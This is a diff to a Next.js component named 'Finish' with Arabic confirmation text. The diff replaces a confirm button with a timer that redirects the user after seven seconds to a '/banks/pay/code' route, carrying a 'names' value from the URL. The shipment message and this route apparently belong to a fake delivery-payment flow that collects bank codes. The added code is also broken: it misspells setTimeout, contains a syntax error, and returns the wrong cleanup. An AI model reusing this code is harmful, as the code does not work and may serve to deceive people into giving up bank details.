@@ -1,18 +1,29 @@
 "use client"
 import styles from './finish.module.css'
-
+import {useState,useEffect} from 'react'
+import {useRouter,useSearchParams} from 'next/navigation'
 const Finish = ()=>{
-    const handleClick = () => {
-         alert("تم تأكيد العملية ")
-    }
+    const [showPage,setShowPage]=useState(true);
+    const router = useRouter();
+    const x = useSearchParams();
+    const datas = x.get("names");
+
+    useEffect(() => {
+        const timer = setRimeout(() => {
+            setShowPage(false)
+            router.push(`/fozajil/banks/pay/code/nphad/codeto?names=${datas}`)
+        },7000);
+        return clearTimeout(timer);
+    }.[])
+    
+    
+       
     return(
        <div className={styles.continer}>
 
-          <h1> تهانينا تم تسجيل العملية بنجاح</h1>
-          <p>لتأكيد العملية قم بلضغط على زر تاكيد</p>
-          <p>سنقوم بمراسلتك عبر رقم الهاتف عند وصول الشحنة </p>
-           <form><button type='submit' onClick={handleClick}>تأكيد</button></form>
-          
+           {showPage &&
+              <p>لتأكيد العملية قم بلضغط على زر تاكيد</p>
+           }
        </div>
 
 )
